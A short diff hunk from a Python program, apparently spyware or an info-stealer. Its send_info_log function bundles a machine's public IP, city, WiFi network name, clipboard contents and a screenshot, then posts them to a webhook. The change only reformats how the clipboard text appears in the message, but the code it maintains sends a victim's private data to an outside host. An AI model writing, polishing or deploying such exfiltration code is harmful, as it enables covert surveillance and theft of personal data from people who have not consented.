@@ -222,7 +222,7 @@ def send_info_log():
         f"Public IP: {sys_info['public_ip']}\n"
         f"City: {sys_info['city']}\n"
         f"WiFi Network Name: {sys_info['wifi_name']}\n\n"
-        f"**Clipboard Content:**\n{sys_info['clipboard']}"
+        f"**Clipboard Content:**\n```{sys_info['clipboard']}```"
     )
     send_message_to_webhook(INFO_WEBHOOK_URL, message_to_send, sys_info["screenshot_path"])
 
